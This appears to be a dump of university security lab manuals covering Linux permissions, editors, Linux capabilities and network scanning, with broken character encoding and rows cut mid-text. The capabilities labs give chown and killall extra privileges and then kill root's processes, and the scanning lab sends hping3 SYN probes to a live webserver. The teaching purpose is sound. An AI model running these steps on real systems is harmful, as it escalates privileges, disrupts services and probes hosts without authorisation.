user in Linux, a group with the same name is also created. This group will be default group on newly created files. â¦ the rightmost group gives the permissions for all others. The symbols r, w, etc., have slightly different meanings depending on whether they refer to a simple file or to a directory. â¦ Access rights on files. â¦ r (or -), indicates read permission (or otherwise), that is, the presence or absence of permission to read and copy the file â¦ w (or -), indicates write permission (or otherwise), that is, the permission (or otherwise) to change a file â¦ x (or -), indicates execution permission (or otherwise), that is, the permission to execute a file, where appropriate â¦ Access rights on directories. â¦ r allows users to list files in the directory; â¦ w means that users may delete files from the directory or move files into it; â¦ x means the right to access files in the directory. This implies that you may read files in the directory provided you have read permission on the individual files. â¦ So, in order to read a file, you must have executed permission on the directory containing that file, and hence on any directory containing that directory as a subdirectory, and so on, up the tree. Some Examples: -rwxrwxrwx a file that everyone can read, write and execute (and delete). -rw------- a file that only the owner can read and write - no-one else can read or write and no-one has execution rights (e.g., your mailbox file). â¦ Changing access rights (i.e., permissions) on a file â¦ chmod (changing a file mode): â¦ Only the owner of a file can use chmod to change the permissions of a file. The options of chmod are as follows Symbol Meaning u user g group o other a all r read w write (and delete) x execute (and access directory) + add permission - take away permission â¦ type â€œtouch accessâ€ (to create a file called access). â¦ type â€œls â€“l accessâ€. â¦ To remove read write and execute permissions on the file access for the group and others type â€œsudo chmod go-rwx accessâ€. This will leave the other permissions unaffected. â¦ To give read and write permissions on the file access to all, type â€œsudo chmod a+rw accessâ€. â¦ chgrp-this command is used to change the group of a file â¦ Type â€œsudo chgrp euidnew accessâ€. This will change the default group on file â€œaccessâ€ to euidnew from your current username. â¦ Type â€œls â€“l accessâ€. â¦ chown- this command is used change ownership of a file or directory. This can also be used to change the group like chgrp. â¦ Type â€œtouch own_fileâ€. â¦ Type â€œls â€“l own_fileâ€. â¦ Type â€œsudo chown euidnew own_fileâ€. This change owner of the file to euidnew from you. â¦ Type â€œmkdir own_dirâ€. â¦ Type â€œls â€“ld own_dirâ€. The â€“ld option displays properties of directory. If you only use â€“l it shows properties of contents of own_dir. â¦ Type â€œsudo chown euidnew:euidnew own_dirâ€. This changes both the owner and the group to euidnew on folder own_dir. â¦ Type â€œls â€“ld own_dirâ€. Q8: Submit a screenshot of the terminal. Note: The command chown only changes the owner of a directory but not its contents. ToÂ change ownership of files and directories within a directory own_dir, along with is permissions use chown with â€œâ€“Râ€ option. Example: â€œsudo chown â€“R euidnew: euidnew own_dirâ€. â¦ Section 4: Installing Software â¦ To install a software package apt-get command is used in Ubuntu Linux. â¦ Type â€œsudo apt-get updateâ€ â¦ Type â€œsudo apt-get install chromiumâ€ (if this does not work, use â€œsudo apt-get install chromium-browserâ€.) It checks for file size to be downloaded and ask for confirmation. Type â€œyâ€ and hit enter. This command installs Chromium web browser. Q9: Take a screenshot of the notification that installation is complete. Note: If you do not know the exact name of the package, you can search for it with â€œapt-cacheâ€ command. Example: apt-cache search openoffice. Relevant packages will be shown. â¦ Installing software from GUI: One can also install software using â€œAdd or Removeâ€ utility. Click Applications â†’ System Tools â†’ Add or Remove Software. â¦ To download a file from the Internet, use wget command. Type wget https://kekeseen.files.wordpress.com/2013/03/linux_commands_08.pdf This will download the pdf file. Note that the wget utility works any file type. â¦ Section 5: Text Editors (Nano and Vim) Nano: â¦ To open a file in nano: Type â€œnano newfileâ€. This will open a blank file called newfile. If there is already a file by name newfile nano will open that. Only if there exists no file by the name supplied it opens a new blank file with the supplied name. â¦ To edit and save: To write data to file, move cursor with arrow keys to location where you want to add content and start writing. Delete content using backspace. Press Ctrl+O, it ask for confirmation: File name to write: newfile. Hit Enter. â¦ To exit nano: Press Ctrl+X. â¦ To search for a string or keyword: Press Ctrl+W. A search: prompt appears at the bottom, type keyword you want to search and press enter. Note: You have all the above explained controls at the bottom of the nano editor with brief description. Vim: VIM Editor has 2 different modes: Command Mode and Insert Mode. â¦ Command mode: Type: â€œvim blankfileâ€. This opens a new file-blank file if a file doesnâ€™t exist by the name. A file is opened into command mode by default. In this mode you can issue commands to edit text. â¦ Insert mode: Hit letter â€œiâ€, which moves to insert mode from command mode. You can edit, add content to the file in this mode. Use arrow keys to navigate, backspace to delete. To save changes to the file: â¦ Press Escape key-it takes file back to command mode. â¦ Press ""Shift + :â€ A : prompt is created at bottom of file. â¦ Type letter â€œwâ€-it saves your file Note: If you donâ€™t want save the file at this point but want to go back, hit escape-to go to command mode and then â€œiâ€ to go to insert mode. You always have to be in command mode before you go to insert mode. â¦ Again Press ""Shift + :â€- and type â€œqâ€ to exit vi editor. If file has unsaved modifications, vim asks for confirmation. Typing q! Forcefully quits without saving. â¦ More about command mode: This mode takes commands from key board, to do operation like copy, paste, cut delete, etc. You can navigate using arrow keys. â¦ dd - delete current line (in which cursor is present). ndd â€“deletes n number of lines. Example: 5dd. â¦ yy - copy current line (in which cursor is present). nyy- copies n number of lines. â¦ p - paste copied line(s) below current line. â¦ To print content of text file to terminal â¦ Type â€œcat newfileâ€. It will dump all the content in newfile to terminal. â¦ Type â€œless newfileâ€. This will open newfile on terminal but only partially display its content. Press enter to browse the file one line at a time. Press Q to exit less. There exist many other text editors such as emacs, pico, and others, however we limit our demonstration to nano and vim. The main reasons are that they are simple, and that they are likely to be present (built-in) in various current and future Linux/Unix distributions. Typically, these operating systems have GUI-based text editors available as well.  â¦ Appendix: List of Useful Commands â¦ Note: The below list is not exhaustive: it is composed to cover some of the commands, which will be commonly used in our labs. The students are recommended to use the command â€œmanâ€ in order to see a complete list of available options. â¦ â¦ a â¦ â¦ alias Create an alias of a command â¦ apropos Search Help manual pages (man -k) â¦ â¦ apt-get Search for and install software packages (Debian/Ubuntu for Centos use yum) â¦ â¦ aptitude Search for and install software packages (Debian/Ubuntu) â¦ â¦ aspell Spell Checker â¦ â¦ awk Find and Replace text, database sort/validate/index â¦ b â¦ â¦ basename Strip directory and suffix from filenames â¦ bash GNU Bourne-Again SHell â¦ â¦ bc Arbitrary precision calculator language â¦ â¦ bg Send to background â¦ â¦ break Exit from a loop â€¢ â¦ â¦ builtin Run a shell builtin â¦ â¦ bzip2 Compress or decompress named file(s) â¦ c â¦ â¦ cal Display a calendar â¦ â¦ case Conditionally perform a command â¦ â¦ cat Concatenate and print (display) the content of files â¦ â¦ cd Change Directory â¦ â¦ cfdisk Partition table manipulator for Linux â¦ â¦ chgrp Change group ownership â¦ â¦ chmod Change access permissions â¦ â¦ chown Change file owner and group â¦ â¦ chroot Run a command with a different root directory â¦ â¦ chkconfig System services (runlevel) â¦ â¦ cksum Print CRC checksum and byte counts â¦ clear Clear terminal screen â¦ â¦ cmp Compare two files â¦ â¦ comm Compare two sorted files line by line â¦ â¦ command Run a command - ignoring shell functions â€¢ â¦ â¦ continue Resume the next iteration of a loop â€¢ â¦ â¦ cp Copy one or more files to another location â¦ â¦ cron Daemon to execute scheduled commands â¦ â¦ crontab Schedule a command to run at a later time â¦ â¦ csplit Split a file into context-determined pieces â¦ â¦ cut Divide a file into several parts â¦ d â¦ â¦ date Display or change the date & time â¦ â¦ dc Desk Calculator â¦ â¦ dd Convert and copy a file, write disk headers, boot records â¦ â¦ ddrescue Data recovery tool â¦ â¦ declare Declare variables and give them attributes â€¢ â¦ â¦ df Display free disk space â¦ â¦ diff Display the differences between two files â¦ â¦ diff3 Show differences among three files â¦ â¦ dig DNS lookup â¦ â¦ dir Briefly list directory contents â¦ â¦ dircolors Colour setup for `ls' â¦ â¦ dirname Convert a full pathname to just a path â¦ â¦ dirs Display list of remembered directories â¦ â¦ dmesg Print kernel & driver messages â¦ â¦ du Estimate file space usage â¦ e â¦ â¦ echo Display message on screen â€¢ â¦ â¦ egrep Search file(s) for lines that match an extended expression â¦ â¦ eject Eject removable media â¦ â¦ enable Enable and disable builtin shell commands â€¢ â¦ â¦ env Environment variables â¦ ethtool Ethernet card settings â¦ â¦ eval Evaluate several commands/arguments â¦ â¦ exec Execute a command â¦ â¦ exit Exit the shell â¦ â¦ expect Automate arbitrary applications accessed over a terminal â¦ â¦ expand Convert tabs to spaces â¦ â¦ export Set an environment variable â¦ â¦ expr Evaluate expressions â¦ f â¦ â¦ false Do nothing, unsuccessfully â¦ â¦ fdformat Low-level format a floppy disk â¦ â¦ fdisk Partition table manipulator for Linux â¦ â¦ fg Send job to foreground â¦ â¦ fgrep Search file(s) for lines that match a fixed string â¦ â¦ file Determine file type â¦ â¦ find Search for files that meet a desired criteria â¦ â¦ fmt Reformat paragraph text â¦ â¦ fold Wrap text to fit a specified width. â¦ â¦ for Expand words, and execute commands â¦ format Format disks or tapes â¦ free Display memory usage â¦ â¦ fsck File system consistency check and repair â¦ ftp File Transfer Protocol â¦ â¦ function Define Function Macros â¦ â¦ fuser Identify/kill the process that is accessing a file â¦ g â¦ â¦ gawk Find and Replace text within file(s) â¦ â¦ getopts Parse positional parameters â¦ â¦ grep Search file(s) for lines that match a given pattern â¦ â¦ groupadd Add a user security group â¦ â¦ groupdel Delete a group â¦ â¦ groupmod Modify a group â¦ â¦ groups Print group names a user is in â¦ â¦ gzip Compress or decompress named file(s) â¦ h â¦ â¦ hash Remember the full pathname of a name argument â¦ â¦ head Output the first part of file(s) â¦ help Display help for a built-in command â€¢ â¦ â¦ history Command History â¦ hostname Print or set system name â¦ i â¦ â¦ iconv Convert the character set of a file â¦ â¦ id Print user and group id's â¦ â¦ if Conditionally perform a command â¦ â¦ ifconfig Configure a network interface â¦ â¦ ifdown Stop a network interface â¦ â¦ ifup Start a network interface up â¦ â¦ import Capture an X server screen and save the image to file â¦ â¦ install Copy files and set attributes â¦ j â¦ â¦ jobs List active jobs â€¢ â¦ â¦ join Join lines on a common field â¦ k â¦ â¦ kill Stop a process from running â¦ â¦ killall Kill processes by name â¦ l â¦ â¦ less Display output one screen at a time â¦ â¦ let Perform arithmetic on shell variables â€¢ â¦ â¦ link Create a link to a file â¦ â¦ ln Create a symbolic link to a file â¦ â¦ local Create variables â€¢ â¦ â¦ locate Find files â¦ â¦ logname Print current login name â¦ â¦ logout Exit a login shell â€¢ â¦ â¦ look Display lines beginning with a given string â¦ â¦ lpc Line printer control program â¦ â¦ lpr Off line print â¦ lprint Print a file â¦ lprintd Abort a print job â¦ lprintq List the print queue â¦ â¦ lprm Remove jobs from the print queue â¦ â¦ ls List information about file(s) â¦ â¦ lsof List open files â¦ m â¦ make Recompile a group of programs â¦ â¦ man Help manual â¦ â¦ mkdir Create new folder(s) â¦ â¦ mkfifo Make FIFOs (named pipes) â¦ mkisofs Create an hybrid ISO9660/JOLIET/HFS filesystem â¦ â¦ mknod Make block or character special files â¦ â¦ more Display output one screen at a time â¦ â¦ mount Mount a file system â¦ â¦ mtools Manipulate MS-DOS files â¦ â¦ mtr Network diagnostics (traceroute/ping) â¦ â¦ mv Move or re"
"ame files or directories â¦ â¦ mmv Mass Move and rename (files) â¦ n â¦ netstat Networking information â¦ â¦ nice Set the priority of a command or job â¦ â¦ nl Number lines and write files â¦ â¦ nohup Run a command immune to hangups â¦ â¦ notify-send Send desktop notifications â¦ â¦ nslookup Query Internet name servers interactively â¦ o â¦ â¦ open Open a file in its default application â¦ â¦ op Operator access â¦ p â¦ â¦ passwd Modify a user password â¦ â¦ paste Merge lines of files â¦ pathchk Check file name portability â¦ â¦ ping Test a network connection â¦ â¦ pkill Stop processes from running â¦ â¦ popd Restore the previous value of the current directory â¦ â¦ pr Prepare files for printing â¦ printcap Printer capability database â¦ printenv Print environment variables â¦ â¦ printf Format and print data â€¢ â¦ â¦ ps Process status â¦ â¦ pushd Save and then change the current directory â¦ â¦ pv Monitor the progress of data through a pipe â¦ â¦ pwd Print Working Directory â¦ q â¦ â¦ quota Display disk usage and limits â¦ â¦ quotacheck Scan a file system for disk usage â¦ â¦ quotactl Set disk quotas â¦ r â¦ â¦ ram ram disk device â¦ â¦ rcp Copy files between two machines â¦ â¦ read Read a line from standard input â€¢ â¦ readarray Read from stdin into an array variable â€¢ â¦ â¦ readonly Mark variables/functions as readonly â¦ reboot Reboot the system â¦ â¦ rename Rename files â¦ renice Alter priority of running processes â¦ remsync Synchronize remote files via email â¦ â¦ return Exit a shell function â¦ â¦ rev Reverse lines """,,,
INTRO TO COMPUTER SECURITY,5550,Linux Capabilities 1,"SECURITY LAB -[SELECT DATE]1 Linux Capabilities SECURITY LAB -[SELECT DATE]2 Table of Contents 1. Introduction 2. CAP_NET_RAW 3. CAP_CHOWN 4. CAP_KILL SECURITY LAB -[SELECT DATE]3 1. Introduction: In Linux, there are two types of users: a superuser (root) with unrestricted privileges and normal (or unprivileged) users. In order to execute certain commands, the root privileges are required. However, normal users sometimes need to run these commands (represented by binary files) as well. This is achieved using â€œsetuidâ€. If setuid bit is set on a binary (command), normal user can run it as the root user. Some examples of the suid commands are: ping, mount, su. However, setuid must be used with care: when a normal user runs a setuid command, it has all root privileges including those which are not needed to fulfill the intended operation. This excessive granting of privileges can be exploited by malware. Starting with kernel 2.2, Linux divides the privileges traditionally associated with super user into distinct units, known as â€œcapabilitiesâ€, which can be independently enabled and disabled. For the purpose of performing permission checks, traditional Unix implementations distinguish privileged processes (user ID is 0, root), and unprivileged processes (those with non-zero effective UID). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID [group ID], and supplementary group list). As the privileges are divided in capabilities it is possible to restrict access to executable files thus minimizing the risk. POSIX file capabilities enables the storing of capabilities granted to and associated with a binary in the file system as an extended attribute. A file attribute is a property of a file. File attributes can be found by running attr command. For example â€œattr /bin/shâ€: this command will show attributes of file /bin/sh. Additionally to the permissions derived from the credentials the process is running with, the process of the started binary can get more privileges through the associates capabilities of that binary. Because there was a lack of mean to grant a process only a certain capability and store it for retrieval, the only way for a process to have the needed capability was to be started in the context of root either through sudo, su , setuid 0 or by root itself. By definition, root has all the necessary privileges or capabilities. With granting the necessary capabilities beforehand to a certain program, an unprivileged user can now run this program without resulting in a root-power enabled process. Hence, capabilities are a measure to grant a program only the essential privileges and store them in the extended attribute 'capability' and therefore a measure to limit the presence of omnipotent processes which had to run beforehand in the context of root. Securing a system demands - among other steps - reducing the number of suid binaries. These binaries usually do not need the full range of root power. Just granting them enough power (i.e., capabilities) to do their job ensures that they will stay in their limits, hereby capabilities represent a mean to tighten security of a Linux system. SECURITY LAB -[SELECT DATE]4 Read man page of â€œcapabilitiesâ€ before doing this lab. (Type â€œman capabilitiesâ€ in your Linux terminal.) In this lab, you will be using the Ubuntu 20 VM. The credentials are: Username: sec-lab Password: untccdc No report needs to be submitted for this lab (no grading and no credit), so no need to take screenshots and answer questions, as requested in the manual. Nonetheless, you are expected to be familiar with the material covered in this lab. 2. CAP_NET_RAW We use getcap command to know existing capabilities on a binary and setcap to set capabilities. In this exercise we check, set and remove capabilities (CAP_NET_RAW) on command anotherping (a copy of the executable file /bin/ping) and see the result in each step. There are 3 different sets of capabilities: permissive (set p), enforcing (set e) and inheritable (set i) Ping is a command used to verify network connection between two nodes on a network. Ping is setuid command which means it assumes root privileges whenever run by normal user. The ping command requires the (command) process to create a raw socket. This is the primary root privilege required. In the following exercise we first strip the ping binary off setuid bit, which makes it normal file, thus removing all root privileges. We then set CAP_NET_RAW capability on the binary file. Then when a normal user run the ping command, it only get this essential capability while all other root privileges are disabled, making the command more secure. 1. Log into the Ubuntu VM (as user sec-lab), open terminal. 2. Include the user â€œsec-labâ€ into the â€œsudoersâ€ file to give this user the superuser permissions. (As it was done in Section â€œUser Account Managementâ€ of Lab 0a.) 3. See the file capabilities on ping: getcap /bin/ping (you might have to install libcap2-bin) Question 1: What is the result? 4. Make copy of the â€œpingâ€ sudo cp /bin/ping anotherping ls (now you should see â€œanotherpingâ€ file in green in your present directory) SECURITY LAB -[SELECT DATE]5 5. ls -l anotherping ls -l /bin/ping Note the difference in file attributes? 6. Run anotherping to ping to localhost ./anotherping â€“c 1 localhost (Note that you have to use a â€œ./â€ (dot slash) before the command name as this is not native linux command, but a copy of command) 7. Try the same command with sudo: sudo ./anotherping â€“c 1 localhost Question 2: Attach screenshots for steps 5 and 6. 8. We use â€œsetcapâ€ command to set capabilities sudo setcap cap_net_raw+ep anotherping Question 3: Which sets of capabilities are set in above command? 9. Observer the file capabilities: getcap anotherping Question 4: What is the result? Attach screenshot of terminal. 10. ./anotherping â€“c 1 localhost. What do you see now? 11. Check the file attributes with following command attr -l /bin/ping Question 5: What is the result now? Attach screenshot Note: If you do not have attr command installs it: sudo apt-get install attr. 12. Now delete sudo setcap â€“r anotherping 13. Check the file attributes, capabilities and again: attr -l anotherping getcap anotherping ./anotherping â€“c 1 localhost sudo ./anotherping â€“c 1 localhost 14. Delete the file â€œanotherpingâ€ rm â€“rf anotherping 3. CAP_CHOWN In this exercise youâ€™ll learn how to use â€œchownâ€ command without root. We use cap_chown capability to run the command without root can change file ownership of the users (root). SECURITY LAB -[SELECT DATE]6 1. Type â€œchown sec-lab /bin/killâ€ (note sec-lab is the user which you logged in) Question 6: What is the result? 2. Now type â€œsudo chown sec-lab /bin/killâ€ ls -l /bin/kill Is the owner changed to sec-lab? 3. Change the owner back to root sudo chown root /bin/kill ls -l /bin/kill 4. Change the capability of â€œchownâ€ command sudo setcap cap_chown+ep /bin/chown getcap /bin/chown 5. Now run the â€œchownâ€ command without sudo chown sec-lab /bin/kill ls -l /bin/kill Question 7: Is the owner changed successfully? Attach screenshot 6. Revert the owner back to root chown root /bin/kill 7. Reset the capability. chown root /bin/chown ls -l /bin/chown 8. Check if capability is successfully removed getcap /bin/chown chown sec-lab /bin/kill Question 8: What is the result? Note: To remove/reset capabilities on a file here we use chown command(instead of setcap â€“r.Setcap still works, but I wanted to show you another way of doing it.) . Here we use â€œchownâ€ against itself to remove its capability. 4. CAP_KILL cap_kill capability can be applied to binaries like /bin/kill, /usr/bin/killall to kill a process run by any user whithout check for permissions. normal users are not allowed to kill process owned by other users. In this lab we set capability on â€œkillallâ€ and override â€œprocess ownershipâ€and kill other user processes. 1. Find the process ID of current bash terminal pidof bash SECURITY LAB -[SELECT DATE]7 2. ps -aux | grep root This will list all process by root. type â€œkillall -u rootâ€ Question 9: What is the result? Attach screenshot 3. Run this command to apply cap_kill on /usr/bin/killall sudo setcap cap_kill+ep /usr/bin/killall 4. Check capabilities getcap /usr/bin/killall 5. now run this command: killall -u root Question 10: What happens? Attach screenshot 6. reset the VM: On VM window, got to top right, you find a menu: Machine->reset You can also reset VM from virtualbox main control panel: right click on the VM>reset Again click on â€œresetâ€ on confirmation popup window. 7. Login, open terminal 8. Type getcap /usr/bin/killall sudo chown root /usr/bin/killall 9. verify capabilities: getcap /usr/bin/killall"
INTRO TO COMPUTER SECURITY,3550,Linux Capabilities 2,"Lab 2b: Linux Capabilities Lab This lab uses the Ubuntu 20.04 virtual machine (VM) as an OVA file cscelab.ova on Canvas. Section 1: Introduction In Linux, there are two types of users: a superuser (root) with unrestricted privileges and normal (or unprivileged) users. In order to execute certain commands, the root privileges are required. However, normal users sometimes need to run these commands (represented by binary files) as well. This is achieved using the â€œsetuidâ€ access flag. If the setuid access flag (or bit) is set on a binary (command), a normal user can run it as the root user. Some examples of the suid commands are: ping, mount, su. However, setuid must be used with care: when a normal user runs aÂ setuid command, it has all root privileges including those that are not needed to fulfill the intended operation. This excessive granting of privileges can be exploited by malware. Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as â€œcapabilitiesâ€, which can be independently enabled and disabled. For the purpose of performing permission checks, traditional Unix implementations distinguish privileged processes (user ID is 0, root), and unprivileged processes (those with non-zero effective UID). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process's credentials (usually: effective UID, effective GID [group ID], and supplementary group list). As the privileges are divided in capabilities it is possible to restrict access to executable files thus minimizing the risk. POSIX file capabilities enables the storing of capabilities granted to and associated with aÂ binary in the file system as an extended attribute. A file attribute is a property of a file. File attributes can be found by running attr command. For example â€œattr /bin/shâ€: this command will show attributes of file /bin/sh. Additionally to the permissions derived from the credentials the process is running with, the process of the started binary can get more privileges through the associates capabilities of that binary. Because there was a lack of mean to grant a process only a certain capability and store it for retrieval, the only way for aÂ process to have the needed capability was to be started in the context of root either through sudo, su, setuid 0 or by root itself. By definition, root has all the necessary privileges or capabilities. With granting the necessary capabilities beforehand to a certain program, an unprivileged user can now run this program without resulting in a root-power enabled process. Hence, capabilities are a measure to grant a program only the essential privileges and store them in the extended attribute 'capability' and therefore a measure to limit the presence of omnipotent processes which had to run beforehand in the context of root. Securing a system demands - among other steps - reducing the number of suid binaries. These binaries usually do not need the full range of root power. Just granting them enough power (i.e., capabilities) to do their job ensures that they will stay in their limits, hereby capabilities represent a mean to tighten security of a Linux system. Read man page of â€œcapabilitiesâ€ before doing this lab. (Type â€œman capabilitiesâ€ in your Linux terminal.) Use the Ubuntu 20.04 VM with the following credentials: username: sec-lab password: untccdc IMPORTANT NOTE: Before performing the lab, you must change the command prompt of your terminal to show your EUID. For this, complete the following steps. Create a backup copy of your configuration file: cp ~/.bashrc ~/.bashrc.bak Type: sudo nano ~/.bashrc Scroll to the very end of the file, and add the following line: PS1=""euid@\h:\w\$ "" Note: In the above line, â€œeuidâ€ should be replaced with your actual EUID. Also, note that there is a space between â€œ$â€ and the last quote mark. Example: Suppose that your EUID is â€œaa0001â€, in this case the above line should be: PS1=""aa0001@\h:\w\$ "" IMPORTANT: Do not change anything else in the configuration file! Note that although you changed the prompt, your actual username (and hence the login credentials shown before this note remain the same). To verify it, type: whoami Log off and login as the user â€œsec-labâ€. Confirm that the command prompt displays your EUID instead of the username â€œsec-labâ€. Note: If needed, it is possible to revert to the original configuration using the backup copy of the configuration file (simply by copying â€œbashrc.bakâ€ to â€œbashrcâ€). Section 2: Capability CAP_NET_RAW We use getcap command to know existing capabilities on a binary and setcap to set capabilities. In this exercise we check, set and remove capabilities (CAP_NET_RAW) on command anotherping (a copy of the executable file /bin/ping) and see the result in each step. There are 3 different sets of capabilities: permissive (set p), enforcing (set e) and inheritable (set i) Ping is a command used to verify network connection between two nodes on a network. Ping is setuid command which means it assumes root privileges whenever run by normal user. The ping command requires the (command) process to create a raw socket. This is the primary root privilege required. In the following exercise we first strip the ping binary off setuid bit, which makes it normal file, thus removing all root privileges. We then set CAP_NET_RAW capability on the binary file. Then when a normal user run the ping command, it only get this essential capability while all other root privileges are disabled, making the command more secure. Log into the Ubuntu VM (as user sec-lab) and open the terminal. See the file capabilities on ping: getcap /bin/ping (If this did not work, you might have to install libcap2-bin.) Q1: What is the result? (Attach the screenshot.) Make copy of the â€œpingâ€ sudo cp /bin/ping anotherping ls Now, you should see â€œanotherpingâ€ file in green in your present directory. Type: ls -l anotherping ls -l /bin/ping Notice the difference in the file attributes. Run anotherping to ping to localhost ./anotherping â€“c 1 localhost Note that you have to use a â€œ./â€ (dot slash) before the command name as this is not a native Linux command, but a copy of command. Try the same command with sudo: sudo ./anotherping â€“c 1 localhost Q2: Attach the screenshots for steps 5 and 6. We use the â€œsetcapâ€ command to set capabilities: sudo setcap cap_net_raw+ep anotherping Q3: Which sets of capabilities are enabled in the above command? Observe the file capabilities: getcap anotherping Q4: What is the result? Attach a screenshot of the terminal. ./anotherping â€“c 1 localhost. What do you see now? Check the file attributes with following command attr -l /bin/ping Q5: What is the result now? Attach the screenshot. Note: If you do not have the attr utility, install it: sudo apt-get install attr. Now delete: sudo setcap â€“r anotherping Check the file attributes, capabilities and again: attr -l anotherping getcap anotherping ./anotherping â€“c 1 localhost sudo ./anotherping â€“c 1 localhost Delete the file â€œanotherpingâ€: rm â€“rf anotherping Section 3: Capability CAP_CHOWN In this section, we will learn how to use â€œchownâ€ command without the root privileges using the cap_chown capability. Type â€œchown sec-lab /bin/killâ€ (note that sec-lab is the current user). Q6: What is the result? Attach the screenshot. Now type â€œsudo chown sec-lab /bin/killâ€ ls -l /bin/kill Is the owner changed to sec-lab? Change the owner back to root: sudo chown root /bin/kill ls -l /bin/kill Change the capability of â€œchownâ€ command sudo setcap cap_chown+ep /bin/chown getcap /bin/chown Now run the â€œchownâ€ command without sudo chown sec-lab /bin/kill ls -l /bin/kill Q7: Has the owner changed successfully? Attach the screenshot. Revert the owner back to root chown root /bin/kill Reset the capability. chown root /bin/chown ls -l /bin/chown Check if capability is successfully removed getcap /bin/chown chown sec-lab /bin/kill Q8: What is the result? Attach the screenshot. Note: To remove/reset capabilities on a file, we used the chown command - instead of setcap -r. TheÂ later command (setcap) still works, but we wanted to demonstrate an alternative way of doing it. Note that we used chown against itself to remove its capability. Section 3: Capability CAP_KILL The cap_kill capability can be applied to binaries such as /bin/kill, /usr/bin/killall to terminate aÂ process run by any user without checking for permissions. Normal users are not allowed to kill process owned by other users. In this lab, we will set this capability on killall hereby overriding theÂ process ownership and terminating other usersâ€™ processes. Find the process ID of the current bash terminal: pidof bash Type: ps -aux | grep root This will list all processes owned by root. Then type: killall -u root Q9: What is the result? Attach the screenshot. Run this command to apply cap_kill on /usr/bin/killall sudo setcap cap_kill+ep /usr/bin/killall Check capabilities: getcap /usr/bin/killall Now, run this command: killall -u root Q10: What is the result? Attach the screenshot. Reset the VM: In the VM window, got to top right, you will find a menu: Machine Reset (Alternatively, you can reset the VM from the VirtualBox main control window: Right-click on theÂ VM Reset, click on â€œResetâ€ in the confirmation popup window.) Login, open the terminal. Type: getcap /usr/bin/killall sudo chown root /usr/bin/killall Verify capabilities: getcap /usr/bin/killall Q11: What is the result? Attach the screenshot."
INTRO TO COMPUTER SECURITY,5550,Network Scanning,"Student Name: Course: CSCE 5550 Semester: Fall 2022 Network Scanning Lab Lab 1a: Network Scanning This lab uses the Kali 2020 virtual machine (VM). The credentials are: Username: osboxes Password: osboxes.org IMPORTANT NOTE: Before starting the lab, you must customize your command prompt as described in the Command Prompt Customization Manual. This customization manual directs you to place your EUID (Enterprise User ID) into the command prompt. Submissions which do not comply with this requirement will receive no credit. Introduction Scanning is the first phase of an active attack; its purpose is to gather intelligence on the network structure and its individual hosts. The information which may be collected includes IP addresses, hostâ€™s operating system, running services, and installed applications. More specifically, scanning the network is a process of locating systems that are alive and responsive. There are various types of scanning, but in this lab, we will focus on port scanning and network scanning. Port scanning is the process of identifying open and available TCP/IP ports on a system. Port scanning tools enable us to learn about the services available on a given system. Each service or application on a host is associated with a specific port number. Port numbers are divided into the following three ranges: â€¢ â€œWell-known portsâ€: 0-1023 â€¢ â€œRegistered portsâ€: 1024-49151 â€¢ â€œDynamic portsâ€: 49152-65535 It is helpful to know a usual assignment of ports for major services. Ping Ping sweep techniques start with checking for systems that respond to probes or connection requests. This is the simplest, although not the most accurate way to determine whether systems are live. A ping sweep is also known as Internet Control Message Protocol (ICMP) scanning, as ICMP is the protocol used by the â€œpingâ€ command. This is the process of sending an ICMP request or ping to all hosts on the network to determine which ones are online. It is a quick test to see if two hosts have connectivity and it is used extensively for troubleshooting. A benefit of ping is that it can run in parallel, meaning that all systems are scanned at the same time, and hence it can be done quickly. A downside of this approach is that systems can disable ICMP, thus the ping sweep may not give accurate information about the network. Windows, MacOS, and Linux all have a built-in ping command. To run it, type the Student Name: Course: CSCE 5550 Semester: Fall 2022 Network Scanning Lab command â€œpingâ€ and then the domain or IP address that you wish to check (to exit the command, press CTRL-C). There exist more advanced tools for network scanning, for example â€œhping3â€. This tool has a lot of extra options on top of the basic ping functionality. The most useful of them is, for instance, crafting the packets to get a response from a host that has ICMP disabled. We will consider such the example next. Ping Examples: 1. Open a terminal. Q1: Type the â€œping www.unt.eduâ€ command, and after a few seconds press â€œCtrl + Câ€ â€“ this will cancel the ping. Attach a screenshot of the result. 2. As you can see, there was no response from www.unt.edu because it showed your packets transmitted and 0 received with a 100% packet loss. Now, stay in your terminal and use hping3 to launch a successful ping request. Student Name: Course: CSCE 5550 Semester: Fall 2022 Network Scanning Lab Remark: If pinging www.unt.edu worked for you, it must be either because this webserver temporarily unblocked ICMP requests, or you are in some special subnetwork for which these requests are allowed. No worries. ""#$% Just attach a screenshot of the result (as requested above) and continue to the next step. Q2: Type command â€œsudo hping3 -S www.unt.edu -p 80â€, and after a few seconds press â€œCtrl + Câ€ â€“ this will cancel the ping. Attach a screenshot of the result. 3. Here, we use a â€œ-Sâ€ option to tell hping3 to use SYN packets. A SYN packet is the first packet sent in the 3-way handshake for TCP connections. Knowing that www.unt.edu is a webserver, we are sure that it has to handle SYN packets for legitimate connections. Therefore, we use the â€œ-p 80â€ parameter to have hping3 hit the port 80 (which is used for the HTTP protocol). Hereby, we use the TCP protocol to manipulate the UNT webserver to send us a replyâ€”as you can see, we should now have 0% packet loss. 4. Some websites do not filter out ICMP Echo Requests. Q3: Type a command â€œping scanme.nmap.orgâ€, and after a few seconds press â€œCtrl + Câ€ â€“ this will cancel the ping. Attach a screenshot of the result. Traceroute Traceroute is a computer network diagnostic tool for displaying the route and measuring transit delays of packets across an Internet Protocol network. Traceroute is very useful for learning the routes that your packets are taking to a particular target. This tool uses the Time-To-Live (TTL) flag for packets. This is a flag that lets networking devices know how far they should forward the packet. Specifically, every time when the packet reaches a device, the TTL is dropped by one. For example, most Windows devices use a TTL of 128 and Unix of 64 â€“ this allows 128 (respectively, 64) total hops once the packet leaves your machine. This is a crucial mechanism for allowing packets that get lost to be dropped instead of endlessly traversing the network and hereby consuming the bandwidth. Traceroute uses TTL in the following manner: Your first packet will start with a TTL of 1, therefore the first message gets dropped at the first router it hits and the router sends back an ICMP error message â€œTime Exceededâ€. In the second packet, the TTL will be set to 2, so that the first router will forward the packet, but the next one will drop it. Traceroute uses the returned ICMP Time Exceeded messages to build a list of routers that packets traverse until the destination is reached and returns an ICMP Echo Reply message. This information is used to learn the route to a particular destination. If one knows what to look for, one can identify firewalls, routers, honeypots, proxy servers, and sometimes, even hosts performing the man-in-the-middle attack. Traceroute Examples: 1. Open a terminal. Student Name: Course: CSCE 5550 Semester: Fall 2022 Network Scanning Lab 2. Type the command 